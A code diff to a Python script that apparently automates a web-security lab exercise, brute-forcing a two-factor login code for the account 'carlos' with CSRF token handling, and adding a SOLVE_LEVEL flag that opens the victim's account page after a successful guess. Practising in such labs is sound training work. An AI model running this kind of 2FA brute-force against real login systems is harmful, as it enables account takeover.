@@ -7,6 +7,8 @@ from bs4 import BeautifulSoup
 PROVIDED_USER = 'carlos'
 PROVIDED_PW = 'montoya'
 
+SOLVE_LEVEL = False
+
 
 # Use BeautifulSoup's html parser to grab the csrf token from some html string
 def parse_tree_for_csrf(text):
@@ -74,6 +76,10 @@ async def try2faCodeAsync(code_to_attempt):
     response = await s.post(login2_url, data=login2data, allow_redirects=False)
     status = response.status_code
     if status == 302:
+        # SOLVE_LEVEL is a const used to determine if the level should be completed or left as is for grading
+        if SOLVE_LEVEL:
+            account_url = f'https://{site}/my-account?id=carlos'
+            await s.get(account_url)
         return code
     return 0
 
